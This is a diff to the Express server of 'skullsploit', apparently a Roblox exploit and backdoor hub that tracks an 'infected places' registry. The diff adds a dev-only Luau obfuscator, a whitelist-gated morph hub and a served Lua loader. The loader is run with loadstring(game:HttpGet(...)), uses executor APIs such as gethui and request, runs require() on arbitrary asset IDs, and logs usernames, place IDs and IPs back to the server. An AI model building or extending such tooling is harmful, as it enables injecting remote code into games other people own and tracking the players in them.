@@ -4,6 +4,7 @@ const bcrypt = require('bcryptjs');
 const fs = require('fs');
 const path = require('path');
 const crypto = require('crypto');
+const luaobf = require('./lib/luaobf');
 
 const app = express();
 
@@ -21,6 +22,10 @@ const SCRIPTS_FILE = path.join(DATA_DIR, 'scripts.json');
 const LOGS_FILE    = path.join(DATA_DIR, 'logs.json');
 const AUDIT_FILE   = path.join(DATA_DIR, 'audit.json');
 const PLACES_FILE  = path.join(DATA_DIR, 'places.json');
+const MORPHS_FILE          = path.join(DATA_DIR, 'morphs.json');
+const MORPH_CUSTOM_FILE    = path.join(DATA_DIR, 'morph-custom.json');
+const MORPH_WL_FILE        = path.join(DATA_DIR, 'morph-whitelist.json');
+const MORPH_LOG_FILE       = path.join(DATA_DIR, 'morph-log.json');
 const SECRET_FILE  = path.join(DATA_DIR, '.session-secret');
 
 const LOG_MAX   = 2000;     // execution log entries
@@ -95,8 +100,38 @@ function seed() {
   if (!fs.existsSync(LOGS_FILE))    writeJson(LOGS_FILE, []);
   if (!fs.existsSync(AUDIT_FILE))   writeJson(AUDIT_FILE, []);
   if (!fs.existsSync(PLACES_FILE))  writeJson(PLACES_FILE, []);
+  if (!fs.existsSync(MORPHS_FILE))        writeJson(MORPHS_FILE, {});
+  if (!fs.existsSync(MORPH_CUSTOM_FILE))  writeJson(MORPH_CUSTOM_FILE, {});
+  if (!fs.existsSync(MORPH_WL_FILE))      writeJson(MORPH_WL_FILE, []);
+  if (!fs.existsSync(MORPH_LOG_FILE))     writeJson(MORPH_LOG_FILE, []);
 }
 seed();
+
+// One-time migration: copy all built-in morphs from morphs.json into the custom
+// store so the owner can edit/delete every entry from /morphs. Marker file
+// guards re-imports. To re-run, delete data/.morph-imported.
+const MORPH_IMPORTED_FLAG = path.join(DATA_DIR, '.morph-imported');
+(function migrateBuiltinsIfNeeded() {
+  if (fs.existsSync(MORPH_IMPORTED_FLAG)) return;
+  const builtin = readJson(MORPHS_FILE, {});
+  const custom  = readJson(MORPH_CUSTOM_FILE, {});
+  const builtinNames = Object.keys(builtin);
+  if (builtinNames.length === 0) return;
+  let added = 0;
+  for (const name of builtinNames) {
+    if (!custom[name]) {
+      custom[name] = {
+        ...builtin[name],
+        addedBy: 'system',
+        addedAt: new Date().toISOString()
+      };
+      added++;
+    }
+  }
+  writeJson(MORPH_CUSTOM_FILE, custom);
+  fs.writeFileSync(MORPH_IMPORTED_FLAG, new Date().toISOString());
+  console.log(`[morphs] migrated ${added}/${builtinNames.length} built-in morphs into custom store`);
+})();
 
 // ----- infected places registry (persistent) -----
 // every game that has ever heartbeated is remembered here, so a place still shows
@@ -224,6 +259,8 @@ const logLimiter       = rateLimit({ windowMs: 60 * 1000,      max: 240, message
 const likeLimiter      = rateLimit({ windowMs: 60 * 1000,      max: 60,  message: 'slow down on the likes' });
 const writeLimiter     = rateLimit({ windowMs: 60 * 1000,      max: 60,  message: 'slow down' });
 const auditLimiter     = rateLimit({ windowMs: 60 * 1000,      max: 60,  message: 'too many requests' });
+const morphCheckLimiter= rateLimit({ windowMs: 60 * 1000,      max: 120, message: 'too many checks' });
+const morphLogLimiter  = rateLimit({ windowMs: 60 * 1000,      max: 240, message: 'too many uses logged' });
 
 // ----- in-memory state -----
 const HEARTBEAT_TTL = 30 * 1000;
@@ -293,6 +330,16 @@ function isOwnerUsername(username) {
   const d = devs.find(x => x.username === username);
   return !!(d && d.isOwner);
 }
+// Devs always have morph access. Regular users need to be promoted by an owner
+// (sets isMorph=true on their users.json record).
+function hasMorphAccess(username) {
+  if (!username) return false;
+  const devs = readJson(DEVS_FILE, []);
+  if (devs.find(x => x.username === username)) return true;
+  const users = readJson(USERS_FILE, []);
+  const u = users.find(x => x.username === username);
+  return !!(u && u.isMorph);
+}
 function requireUser(req, res, next) {
   if (!req.session.user) return res.status(401).json({ error: 'sign in to continue' });
   if (!userStillExists(req.session)) {
@@ -319,6 +366,18 @@ function requireOwner(req, res, next) {
   if (!userStillExists(req.session) || !isOwnerUsername(u.username)) {
     return res.status(403).json({ error: 'owner only' });
   }
+  next();
+}
+function requireMorphAccess(req, res, next) {
+  const u = req.session.user;
+  if (!u) return res.status(403).json({ error: 'morph access required' });
+  if (!userStillExists(req.session)) {
+    return req.session.destroy(() => {
+      res.clearCookie('skl.sid');
+      res.status(401).json({ error: 'account no longer exists' });
+    });
+  }
+  if (!hasMorphAccess(u.username)) return res.status(403).json({ error: 'morph access required' });
   next();
 }
 
@@ -416,8 +475,10 @@ app.post('/api/auth/logout', (req, res) => {
 
 app.get('/api/session', (req, res) => {
   if (!req.session.user) return res.json({ user: null });
-  const isOwner = isOwnerUsername(req.session.user.username) && req.session.user.kind === 'dev';
-  res.json({ user: { ...req.session.user, isOwner } });
+  const u = req.session.user;
+  const isOwner = isOwnerUsername(u.username) && u.kind === 'dev';
+  const isMorph = hasMorphAccess(u.username);
+  res.json({ user: { ...u, isOwner, isMorph } });
 });
 
 // ===== DEVS (owner only) =====
@@ -504,6 +565,49 @@ app.post('/api/devs/:username/demote', writeLimiter, requireOwner, (req, res) =>
   writeJson(DEVS_FILE, devs);
   audit(req, 'dev.demoted', target, {});
   res.json({ ok: true, isOwner: false });
+});
+
+// ===== USERS (owner only — for managing the morph role) =====
+app.get('/api/users', requireOwner, (req, res) => {
+  const users = readJson(USERS_FILE, []);
+  res.json({
+    users: users.map(u => ({
+      username: u.username,
+      createdAt: u.createdAt || null,
+      keyUsed: u.keyUsed || null,
+      isMorph: !!u.isMorph,
+    }))
+  });
+});
+
+app.post('/api/users/:username/promote-morph', writeLimiter, requireOwner, (req, res) => {
+  const target = req.params.username;
+  if (!validUsername(target)) return res.status(400).json({ error: 'invalid username' });
+  const users = readJson(USERS_FILE, []);
+  const u = users.find(x => x.username === target);
+  if (!u) return res.status(404).json({ error: 'not found' });
+  if (u.isMorph) return res.json({ ok: true, isMorph: true });
+  u.isMorph = true;
+  u.morphPromotedAt = new Date().toISOString();
+  u.morphPromotedBy = req.session.user.username;
+  writeJson(USERS_FILE, users);
+  audit(req, 'user.morph_promoted', target, {});
+  res.json({ ok: true, isMorph: true });
+});
+
+app.post('/api/users/:username/demote-morph', writeLimiter, requireOwner, (req, res) => {
+  const target = req.params.username;
+  if (!validUsername(target)) return res.status(400).json({ error: 'invalid username' });
+  const users = readJson(USERS_FILE, []);
+  const u = users.find(x => x.username === target);
+  if (!u) return res.status(404).json({ error: 'not found' });
+  if (!u.isMorph) return res.json({ ok: true, isMorph: false });
+  u.isMorph = false;
+  delete u.morphPromotedAt;
+  delete u.morphPromotedBy;
+  writeJson(USERS_FILE, users);
+  audit(req, 'user.morph_demoted', target, {});
+  res.json({ ok: true, isMorph: false });
 });
 
 // ===== KEYS (owner only) =====
@@ -704,6 +808,533 @@ app.delete('/api/scripts/:id', writeLimiter, requireDev, (req, res) => {
   writeJson(SCRIPTS_FILE, scripts);
   audit(req, 'script.deleted', t.id, { title: t.title, author: t.author });
   res.json({ ok: true });
+});
+
+// ----- luau obfuscator (dev-only) -----
+app.post('/api/obfuscate', writeLimiter, requireDev, (req, res) => {
+  const source = (req.body && typeof req.body.source === 'string') ? req.body.source : '';
+  if (!source.trim()) return res.status(400).json({ error: 'source is empty' });
+  if (source.length > 120_000) return res.status(413).json({ error: 'source too large (max 120kb)' });
+  const b = req.body || {};
+  const opts = {
+    encryptStrings:  b.encryptStrings  !== false,
+    indirectNumbers: b.indirectNumbers !== false,
+    renameLocals:    b.renameLocals    !== false,
+    stripComments:   b.stripComments   !== false,
+  };
+  let r;
+  try { r = luaobf.obfuscate(source, opts); }
+  catch (e) { return res.status(500).json({ error: 'obfuscate failed: ' + (e && e.message || 'unknown') }); }
+  if (!r.ok) return res.status(400).json({ error: r.error });
+  audit(req, 'obfuscate.run', null, {
+    sourceBytes: r.stats.sourceBytes,
+    outputBytes: r.stats.outputBytes,
+    strings: r.stats.strings,
+    numbers: r.stats.numbers,
+    encryptStrings:  !!opts.encryptStrings,
+    indirectNumbers: !!opts.indirectNumbers,
+    renameLocals:    !!opts.renameLocals,
+    stripComments:   !!opts.stripComments,
+  });
+  res.json({ ok: true, output: r.output, stats: r.stats });
+});
+
+// ----- morph hub (separate from skullsploit's gated content) -----
+// The morph GUI is a standalone Roblox tool. Skullsploit only hosts the
+// whitelist + the loader script + usage logs. The whitelist gate is
+// username-based (player runs the loader; loader hits /api/morphs/check
+// with their Roblox username).
+
+const ROBLOX_NAME_RE = /^[A-Za-z0-9_]{3,20}$/;
+
+app.get('/api/morphs', (req, res) => {
+  // Single source of truth: morph-custom.json. The original morphs.json is
+  // a one-time seed migrated on first boot.
+  res.json({ morphs: readJson(MORPH_CUSTOM_FILE, {}) });
+});
+
+// Helper: find a custom-morph entry by case-insensitive name match.
+// Returns the actual stored key so subsequent operations write under the right name.
+function findCustomKey(all, target) {
+  if (all[target]) return target;
+  const lower = String(target).toLowerCase();
+  for (const k of Object.keys(all)) {
+    if (k.toLowerCase() === lower) return k;
+  }
+  return null;
+}
+
+// ----- custom morph CRUD (owner only) -----
+const CUSTOM_NAME_RE  = /^[A-Za-z0-9_\- ]{1,40}$/;
+const CUSTOM_STYLES   = new Set(['args', 'colon', 'call', 'model']);
+
+app.get('/api/morphs/custom', requireMorphAccess, (req, res) => {
+  res.json({ entries: readJson(MORPH_CUSTOM_FILE, {}) });
+});
+
+app.post('/api/morphs/custom', writeLimiter, requireMorphAccess, (req, res) => {
+  const b = req.body || {};
+  const name   = typeof b.name === 'string' ? b.name.trim() : '';
+  const id     = Number(b.id);
+  const style  = typeof b.style === 'string' ? b.style.trim() : '';
+  const method = typeof b.method === 'string' ? b.method.trim() : '';
+  const argsRaw = b.args;
+
+  if (!CUSTOM_NAME_RE.test(name)) return res.status(400).json({ error: 'name must be 1-40 chars (A-Z 0-9 _ - space)' });
+  if (!Number.isFinite(id) || id <= 0) return res.status(400).json({ error: 'id must be a positive number' });
+  if (!CUSTOM_STYLES.has(style)) return res.status(400).json({ error: 'style must be args, colon, call, or model' });
+  if ((style === 'args' || style === 'colon') && !method) return res.status(400).json({ error: 'method required for args/colon styles' });
+
+  // Args: array of strings/numbers. Use the literal string "USERNAME" as a
+  // placeholder — it gets substituted with the player's roblox name at fire time.
+  let args = null;
+  if (Array.isArray(argsRaw)) {
+    args = [];
+    for (const a of argsRaw) {
+      if (typeof a === 'string') args.push(a.slice(0, 200));
+      else if (typeof a === 'number' && Number.isFinite(a)) args.push(a);
+      else if (typeof a === 'boolean') args.push(a);
+      // skip anything else
+    }
+    if (args.length === 0) args = null;
+  }
+
+  const all = readJson(MORPH_CUSTOM_FILE, {});
+  const entry = { id, style };
+  if (method) entry.method = method;
+  if (args)   entry.args   = args;
+  entry.addedBy = req.session.user.username;
+  entry.addedAt = new Date().toISOString();
+
+  all[name] = entry;
+  writeJson(MORPH_CUSTOM_FILE, all);
+  audit(req, 'morph.custom.added', name, { id, style, method, args });
+  res.json({ ok: true, name, entry });
+});
+
+app.delete('/api/morphs/custom/:name', writeLimiter, requireMorphAccess, (req, res) => {
+  const target = String(req.params.name || '').trim();
+  const all = readJson(MORPH_CUSTOM_FILE, {});
+  const key = findCustomKey(all, target);
+  if (!key) return res.status(404).json({ error: 'not found' });
+  delete all[key];
+  writeJson(MORPH_CUSTOM_FILE, all);
+  audit(req, 'morph.custom.removed', key, {});
+  res.json({ ok: true, name: key });
+});
+
+// Update an existing custom morph in place. Any field can be partially updated.
+// Pass `newName` to also rename the entry (the URL still uses the OLD name).
+app.patch('/api/morphs/custom/:name', writeLimiter, requireMorphAccess, (req, res) => {
+  const target = String(req.params.name || '').trim();
+  const all = readJson(MORPH_CUSTOM_FILE, {});
+  const key = findCustomKey(all, target);
+  if (!key) return res.status(404).json({ error: 'not found' });
+
+  const b = req.body || {};
+  const entry = all[key];
+
+  if (b.id !== undefined) {
+    const id = Number(b.id);
+    if (!Number.isFinite(id) || id <= 0) return res.status(400).json({ error: 'id must be a positive number' });
+    entry.id = id;
+  }
+  if (b.style !== undefined) {
+    if (!CUSTOM_STYLES.has(b.style)) return res.status(400).json({ error: 'style must be args, colon, call, or model' });
+    entry.style = b.style;
+  }
+  if (b.method !== undefined) {
+    const m = String(b.method).trim();
+    if (m) entry.method = m; else delete entry.method;
+  }
+  if (b.args !== undefined) {
+    let args = null;
+    if (Array.isArray(b.args)) {
+      args = [];
+      for (const a of b.args) {
+        if (typeof a === 'string') args.push(a.slice(0, 200));
+        else if (typeof a === 'number' && Number.isFinite(a)) args.push(a);
+        else if (typeof a === 'boolean') args.push(a);
+      }
+      if (args.length === 0) args = null;
+    }
+    if (args) entry.args = args;
+    else delete entry.args;
+  }
+  // Final shape sanity: args/colon styles still need a method
+  if ((entry.style === 'args' || entry.style === 'colon') && !entry.method) {
+    return res.status(400).json({ error: 'method required for args/colon styles' });
+  }
+
+  entry.updatedAt = new Date().toISOString();
+  entry.updatedBy = req.session.user.username;
+
+  // Optional rename
+  let finalName = key;
+  if (b.newName && typeof b.newName === 'string') {
+    const nn = b.newName.trim();
+    if (nn !== key) {
+      if (!CUSTOM_NAME_RE.test(nn)) return res.status(400).json({ error: 'new name must be 1-40 chars (A-Z 0-9 _ - space)' });
+      // case-insensitive conflict check, but allow rename to a different case of the same key
+      const conflict = findCustomKey(all, nn);
+      if (conflict && conflict !== key) return res.status(409).json({ error: 'a morph with that name already exists' });
+      delete all[key];
+      all[nn] = entry;
+      finalName = nn;
+    } else {
+      all[key] = entry;
+    }
+  } else {
+    all[key] = entry;
+  }
+
+  writeJson(MORPH_CUSTOM_FILE, all);
+  audit(req, 'morph.custom.updated', key, {
+    renamedTo: finalName !== key ? finalName : undefined,
+    id: entry.id, style: entry.style, method: entry.method, args: entry.args
+  });
+  res.json({ ok: true, name: finalName, entry });
+});
+
+app.get('/api/morphs/check', morphCheckLimiter, (req, res) => {
+  const u = String(req.query.u || '').trim();
+  if (!u) return res.json({ ok: false });
+  const wl = readJson(MORPH_WL_FILE, []);
+  const entry = wl.find(e => e.username.toLowerCase() === u.toLowerCase());
+  if (!entry) return res.json({ ok: false });
+  if (entry.expires && new Date(entry.expires).getTime() < Date.now()) {
+    return res.json({ ok: false, reason: 'expired' });
+  }
+  res.json({ ok: true, expires: entry.expires || null, note: entry.note || '' });
+});
+
+app.post('/api/morphs/log', morphLogLimiter, (req, res) => {
+  const b = req.body || {};
+  const username = typeof b.username === 'string' ? b.username.trim() : '';
+  const morph    = typeof b.morph === 'string' ? b.morph.trim() : '';
+  if (!username || !morph) return res.status(400).json({ error: 'missing username/morph' });
+  if (!ROBLOX_NAME_RE.test(username)) return res.status(400).json({ error: 'invalid username' });
+  if (morph.length > 80) return res.status(400).json({ error: 'morph name too long' });
+
+  // verify the actor IS whitelisted before accepting their log
+  const wl = readJson(MORPH_WL_FILE, []);
+  const isWhitelisted = wl.some(e => e.username.toLowerCase() === username.toLowerCase());
+  if (!isWhitelisted) return res.status(403).json({ error: 'not whitelisted' });
+
+  const log = readJson(MORPH_LOG_FILE, []);
+  log.unshift({
+    at: new Date().toISOString(),
+    username,
+    morph,
+    placeId: b.placeId ? String(b.placeId).slice(0, 32) : null,
+    ip: String(req.ip || '').slice(0, 64)
+  });
+  if (log.length > 5000) log.length = 5000;
+  writeJson(MORPH_LOG_FILE, log);
+  res.json({ ok: true });
+});
+
+// ----- owner-only management -----
+app.get('/api/morphs/whitelist', requireMorphAccess, (req, res) => {
+  res.json({ entries: readJson(MORPH_WL_FILE, []) });
+});
+
+app.post('/api/morphs/whitelist', writeLimiter, requireMorphAccess, (req, res) => {
+  const b = req.body || {};
+  const username = typeof b.username === 'string' ? b.username.trim() : '';
+  if (!ROBLOX_NAME_RE.test(username)) return res.status(400).json({ error: 'invalid roblox username (3-20 chars, A-Z/0-9/_)' });
+  const note = typeof b.note === 'string' ? b.note.slice(0, 200) : '';
+  let expires = null;
+  if (b.days) {
+    const d = Number(b.days);
+    if (Number.isFinite(d) && d > 0) expires = new Date(Date.now() + d * 86400_000).toISOString();
+  }
+  const wl = readJson(MORPH_WL_FILE, []);
+  if (wl.some(e => e.username.toLowerCase() === username.toLowerCase())) {
+    return res.status(409).json({ error: 'already whitelisted' });
+  }
+  const entry = { username, note, addedBy: req.session.user.username, addedAt: new Date().toISOString(), expires };
+  wl.unshift(entry);
+  writeJson(MORPH_WL_FILE, wl);
+  audit(req, 'morph.whitelist.added', username, { note, expires });
+  res.json({ ok: true, entry });
+});
+
+app.delete('/api/morphs/whitelist/:username', writeLimiter, requireMorphAccess, (req, res) => {
+  const target = String(req.params.username || '').trim();
+  let wl = readJson(MORPH_WL_FILE, []);
+  const before = wl.length;
+  wl = wl.filter(e => e.username.toLowerCase() !== target.toLowerCase());
+  if (wl.length === before) return res.status(404).json({ error: 'not whitelisted' });
+  writeJson(MORPH_WL_FILE, wl);
+  audit(req, 'morph.whitelist.removed', target, {});
+  res.json({ ok: true });
+});
+
+app.get('/api/morphs/log', requireMorphAccess, (req, res) => {
+  const limit = Math.min(parseInt(req.query.limit, 10) || 200, 1000);
+  const all = readJson(MORPH_LOG_FILE, []);
+  res.json({ logs: all.slice(0, limit) });
+});
+
+// public loader served as plain text/lua.
+//
+// The script is shaped as a Roblox ModuleScript: it returns a function. The
+// owner uploads it as a free model and shares `require(ASSET_ID)()` with
+// whitelisted users — same invocation pattern as every morph in the list.
+// It deliberately does NOT auto-run (no top-level execution), so it never
+// leaks into a skullsploit auto-loader chain.
+//
+// Loadstring is also supported as a fallback: `loadstring(game:HttpGet("/m.lua"))()()`
+// (note the double call — the module returns a function which then needs to be called).
+function buildMorphLoader(baseUrl) {
+  return `-- skullsploit morphs · module loader
+-- whitelist-gated. ask the owner to add your roblox username.
+--
+-- preferred: upload as a Roblox ModuleScript free model, then:
+--   require(YOUR_ASSET_ID)()
+--
+-- fallback (no model upload):
+--   loadstring(game:HttpGet("${baseUrl}/m.lua"))()()
+--
+-- this script does NOT execute on require. it returns a function. you call
+-- that function to actually open the GUI. lets you bind it to a button or
+-- gate it behind your own logic.
+
+return function()
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local LP = Players.LocalPlayer
+local BASE = "${baseUrl}"
+
+local function httpGet(url)
+  local ok, body = pcall(function() return game:HttpGet(url, true) end)
+  if ok then return body end
+  return nil
+end
+
+local function jdec(s)
+  if not s then return nil end
+  local ok, v = pcall(function() return HttpService:JSONDecode(s) end)
+  if ok then return v end
+  return nil
+end
+
+local function httpPost(url, tbl)
+  if typeof(request) ~= "function" then return end
+  pcall(request, {
+    Url = url, Method = "POST",
+    Headers = { ["Content-Type"] = "application/json" },
+    Body = HttpService:JSONEncode(tbl)
+  })
+end
+
+-- 1. whitelist check
+local check = jdec(httpGet(BASE .. "/api/morphs/check?u=" .. HttpService:UrlEncode(LP.Name)))
+if not check or not check.ok then
+  warn("[morphs] " .. LP.Name .. " is not whitelisted. ask the owner.")
+  return
+end
+
+-- 2. fetch morphs
+local data = jdec(httpGet(BASE .. "/api/morphs"))
+if not data or not data.morphs then
+  warn("[morphs] failed to fetch morph list")
+  return
+end
+
+local list = {}
+for name, e in pairs(data.morphs) do
+  e.__name = name
+  table.insert(list, e)
+end
+table.sort(list, function(a, b) return a.__name:lower() < b.__name:lower() end)
+
+-- 3. fire one morph
+local function fire(entry)
+  local ok, err = pcall(function()
+    local mod = require(entry.id)
+    if entry.style == "args" then
+      local args = entry.args or {}
+      local fn = mod[entry.method]
+      if typeof(fn) == "function" then fn((table.unpack or unpack)(args)) end
+    elseif entry.style == "colon" then
+      local fn = mod[entry.method]
+      if typeof(fn) == "function" then fn(mod) end
+    elseif entry.style == "call" then
+      if typeof(mod) == "function" then mod() end
+    elseif entry.style == "model" then
+      -- module loads itself on require
+    end
+  end)
+  if not ok then warn("[morphs] " .. tostring(entry.__name) .. ": " .. tostring(err)) end
+  httpPost(BASE .. "/api/morphs/log", {
+    username = LP.Name,
+    morph = entry.__name,
+    placeId = tostring(game.PlaceId)
+  })
+end
+
+-- 4. build GUI
+local existing = (gethui and gethui() or game:GetService("CoreGui")):FindFirstChild("SkullMorphs")
+if existing then existing:Destroy() end
+
+local gui = Instance.new("ScreenGui")
+gui.Name = "SkullMorphs"
+gui.ResetOnSpawn = false
+gui.IgnoreGuiInset = true
+gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+gui.Parent = (gethui and gethui()) or game:GetService("CoreGui")
+
+local INK    = Color3.fromRGB(236, 233, 227)
+local DIM    = Color3.fromRGB(144, 141, 134)
+local FAINT  = Color3.fromRGB(79, 77, 72)
+local BG     = Color3.fromRGB(13, 13, 13)
+local BG2    = Color3.fromRGB(20, 20, 20)
+local BG3    = Color3.fromRGB(35, 35, 35)
+local LINE   = Color3.fromRGB(35, 34, 32)
+
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 340, 0, 480)
+frame.Position = UDim2.new(0, 24, 0.5, -240)
+frame.BackgroundColor3 = BG
+frame.BorderSizePixel = 0
+frame.Active = true
+frame.Draggable = true
+frame.Parent = gui
+
+local stroke = Instance.new("UIStroke")
+stroke.Color = LINE
+stroke.Thickness = 1
+stroke.Parent = frame
+
+local header = Instance.new("Frame")
+header.Size = UDim2.new(1, 0, 0, 40)
+header.BackgroundColor3 = BG2
+header.BorderSizePixel = 0
+header.Parent = frame
+
+local hLine = Instance.new("Frame")
+hLine.Size = UDim2.new(1, 0, 0, 1)
+hLine.Position = UDim2.new(0, 0, 1, -1)
+hLine.BackgroundColor3 = LINE
+hLine.BorderSizePixel = 0
+hLine.Parent = header
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, -80, 1, 0)
+title.Position = UDim2.new(0, 14, 0, 0)
+title.BackgroundTransparency = 1
+title.Font = Enum.Font.SourceSansBold
+title.Text = "morphs · " .. LP.Name
+title.TextColor3 = INK
+title.TextSize = 14
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.Parent = header
+
+local count = Instance.new("TextLabel")
+count.Size = UDim2.new(0, 60, 1, 0)
+count.Position = UDim2.new(1, -80, 0, 0)
+count.BackgroundTransparency = 1
+count.Font = Enum.Font.Code
+count.Text = #list .. ""
+count.TextColor3 = DIM
+count.TextSize = 11
+count.TextXAlignment = Enum.TextXAlignment.Right
+count.Parent = header
+
+local close = Instance.new("TextButton")
+close.Size = UDim2.new(0, 32, 1, 0)
+close.Position = UDim2.new(1, -32, 0, 0)
+close.BackgroundTransparency = 1
+close.Font = Enum.Font.SourceSansBold
+close.Text = "x"
+close.TextColor3 = DIM
+close.TextSize = 16
+close.AutoButtonColor = false
+close.Parent = header
+close.MouseEnter:Connect(function() close.TextColor3 = INK end)
+close.MouseLeave:Connect(function() close.TextColor3 = DIM end)
+close.MouseButton1Click:Connect(function() gui:Destroy() end)
+
+local search = Instance.new("TextBox")
+search.Size = UDim2.new(1, -24, 0, 32)
+search.Position = UDim2.new(0, 12, 0, 50)
+search.BackgroundColor3 = BG2
+search.BorderSizePixel = 0
+search.Font = Enum.Font.Code
+search.PlaceholderText = "search..."
+search.PlaceholderColor3 = FAINT
+search.Text = ""
+search.TextColor3 = INK
+search.TextSize = 13
+search.TextXAlignment = Enum.TextXAlignment.Left
+search.ClearTextOnFocus = false
+search.Parent = frame
+local sStroke = Instance.new("UIStroke") sStroke.Color = LINE sStroke.Thickness = 1 sStroke.Parent = search
+local sPad = Instance.new("UIPadding")
+sPad.PaddingLeft = UDim.new(0, 12) sPad.PaddingRight = UDim.new(0, 12)
+sPad.Parent = search
+
+local scroll = Instance.new("ScrollingFrame")
+scroll.Size = UDim2.new(1, -16, 1, -98)
+scroll.Position = UDim2.new(0, 8, 0, 90)
+scroll.BackgroundTransparency = 1
+scroll.BorderSizePixel = 0
+scroll.ScrollBarThickness = 3
+scroll.ScrollBarImageColor3 = LINE
+scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
+scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
+scroll.Parent = frame
+
+local layout = Instance.new("UIListLayout")
+layout.SortOrder = Enum.SortOrder.LayoutOrder
+layout.Padding = UDim.new(0, 1)
+layout.Parent = scroll
+
+local rowMeta = {}
+for i, item in ipairs(list) do
+  local btn = Instance.new("TextButton")
+  btn.Size = UDim2.new(1, 0, 0, 30)
+  btn.BackgroundColor3 = BG2
+  btn.BorderSizePixel = 0
+  btn.Font = Enum.Font.Code
+  btn.Text = "  " .. item.__name
+  btn.TextColor3 = INK
+  btn.TextSize = 12
+  btn.TextXAlignment = Enum.TextXAlignment.Left
+  btn.AutoButtonColor = false
+  btn.LayoutOrder = i
+  btn.Parent = scroll
+  btn.MouseEnter:Connect(function() btn.BackgroundColor3 = BG3 end)
+  btn.MouseLeave:Connect(function() btn.BackgroundColor3 = BG2 end)
+  btn.MouseButton1Click:Connect(function()
+    btn.Text = "  ... " .. item.__name
+    task.spawn(function() fire(item); btn.Text = "  " .. item.__name end)
+  end)
+  table.insert(rowMeta, { name = item.__name:lower(), btn = btn })
+end
+
+search:GetPropertyChangedSignal("Text"):Connect(function()
+  local q = search.Text:lower()
+  for _, r in ipairs(rowMeta) do
+    r.btn.Visible = q == "" or r.name:find(q, 1, true) ~= nil
+  end
+end)
+
+print("[morphs] loaded · " .. #list .. " entries · welcome, " .. LP.Name)
+end
+`;
+}
+
+app.get('/m.lua', (req, res) => {
+  // Prefer a configured SITE_URL when set; otherwise derive from the request
+  // and strip anything that could break out of the Lua string literal we
+  // interpolate the value into (quotes, backslashes, newlines, control chars).
+  let baseUrl = (process.env.SITE_URL || `${req.protocol}://${req.get('host') || ''}`).trim();
+  baseUrl = baseUrl.replace(/[^A-Za-z0-9:/._\-]/g, '');
+  if (!/^https?:\/\//.test(baseUrl)) baseUrl = 'http://localhost:3000';
+  res.type('text/plain').send(buildMorphLoader(baseUrl));
 });
 
 app.post('/api/scripts/:id/like', likeLimiter, requireUser, (req, res) => {
@@ -1032,6 +1663,17 @@ function ownerOnly(file) {
     res.sendFile(path.join(PUBLIC_DIR, file));
   };
 }
+function morphAccessOnly(file) {
+  return (req, res) => {
+    const u = req.session.user;
+    if (!u) return res.redirect('/login');
+    if (!userStillExists(req.session)) {
+      return req.session.destroy(() => { res.clearCookie('skl.sid'); res.redirect('/login'); });
+    }
+    if (!hasMorphAccess(u.username)) return res.redirect('/dashboard');
+    res.sendFile(path.join(PUBLIC_DIR, file));
+  };
+}
 app.get('/dashboard',     gated('dashboard.html'));
 app.get('/games',         gated('games.html'));
 app.get('/game/:placeId', gated('game.html'));
@@ -1039,8 +1681,10 @@ app.get('/scripts',       gated('scripts.html'));
 app.get('/dev',           devOnly('dev.html'));
 app.get('/drops',         devOnly('drops.html'));
 app.get('/logs',          devOnly('logs.html'));
+app.get('/obfuscate',     devOnly('obfuscate.html'));
 app.get('/owner',         ownerOnly('owner.html'));
 app.get('/audit',         ownerOnly('audit.html'));
+app.get('/morphs',        morphAccessOnly('morphs.html'));
 app.get('/login',         (req, res) => res.sendFile(path.join(PUBLIC_DIR, 'login.html')));
 app.get('/signup',        (req, res) => res.sendFile(path.join(PUBLIC_DIR, 'signup.html')));
 
